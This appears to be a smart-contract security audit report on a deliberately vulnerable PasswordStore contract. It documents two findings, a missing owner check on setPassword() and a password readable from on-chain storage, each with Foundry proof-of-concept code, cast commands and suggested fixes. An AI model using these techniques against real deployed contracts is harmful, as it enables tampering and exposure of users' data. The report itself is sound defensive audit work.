# [H-1] `PasswordStore::setPassword()` Has No Access Control - High Severity Vulnerability

**Description**
-----

The `setPassword()` function lacks access control, allowing any address to call it. This function is intended to be accessible only by the contract owner. The absence of proper access control allows any user to modify the password without restrictions.  

**Impact**
----

Any user can call the `setPassword()` function and modify the password, completely bypassing the intended access control mechanism.  

**Proof of Concepts**
-----

The following test case demonstrates that any address can set a password that is subsequently retrieved by the owner, exposing a critical vulnerability in the protocol.
<details>

<summary>CODE</summary>

```solidity
function testAnyone_can_set_password() public {
        vm.startPrank(address(1));
        string memory newPassword = "hackedPassword";
        passwordStore.setPassword(newPassword);
        console.log(newPassword, "set by attacker");

        vm.stopPrank();
        vm.startPrank(owner);
        string memory actualPassword = passwordStore.getPassword();
        console.log(actualPassword, "retrieved by owner");
        assertEq(actualPassword, newPassword);
    }

```

Below is the test output:

```

Ran 1 test for test/PasswordStore.t.sol:PasswordStoreTest
[PASS] testAnyone_can_set_password() (gas: 30163)
Logs:
  hackedPassword set by attacker
  hackedPassword retrieved by owner

Traces:
  [30163] PasswordStoreTest::testAnyone_can_set_password()
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return]
    ├─ [7319] PasswordStore::setPassword("hackedPassword")
    │   ├─ emit SetNetPassword()
    │   └─ ← [Stop]
    ├─ [0] console::log("hackedPassword", "set by attacker") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return]
    ├─ [3598] PasswordStore::getPassword() [staticcall]
    │   └─ ← [Return] "hackedPassword"
    ├─ [0] console::log("hackedPassword", "retrieved by owner") [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.36ms (1.32ms CPU time)
 ```

</details>

**Recommended mitigation**
----

Add a check to control who can access the function. For example:

```solidity
if (owner != msg.sender) {
    revert NotOwner();
}
```

Alternatively, use OpenZeppelin's contracts for more comprehensive access control:

- `AccessControl` - for role-based access management
- `Ownable` - for simple owner-based access restrictions

# [H-2] On-Chain Password Storage Exposes Private Data to All Users

**Description**
-------

All data stored on-chain is visible to anyone. Although the `PasswordStore::s_password` variable is intended to be accessed only by the owner through the `getPassword()` function, blockchain storage is fundamentally transparent and readable by any user. Below is an example of how this vulnerability can be exploited.  

**Impact**
-----

Any user can directly read the password from the contract's storage slots without any restrictions, completely bypassing the access control mechanisms.

**Proof of Concepts**
------------

The following example demonstrates how anyone can read the password directly from the blockchain storage without needing to be the owner. We use Foundry's `cast` tool to read directly from the contract's storage:

1. Create a locally running chain:
   ```bash
   make anvil
   ```

2. Deploy the contract to the chain:
   ```
   make deploy
   ```

3. Read from storage slot 1 (where `PasswordStore::s_password` is stored):

   ```bash
   cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545
   ```

4. The output will be the password in hex format:
   ```
   0x6d7950617373776f726400000000000000000000000000000000000000000014
   ```

5. Convert the hex to a readable string using:
   ```
   cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
   ```

6. This reveals the password:
   ```
   myPassword
   ```

**Recommended mitigation**
------------

The contract's architecture must be reconsidered. One approach is to encrypt the password off-chain and store only the encrypted version on-chain. This requires the user to maintain a separate decryption key off-chain. Additionally, consider removing the `getPassword()` view function to prevent accidental exposure of the decryption key in transaction data.
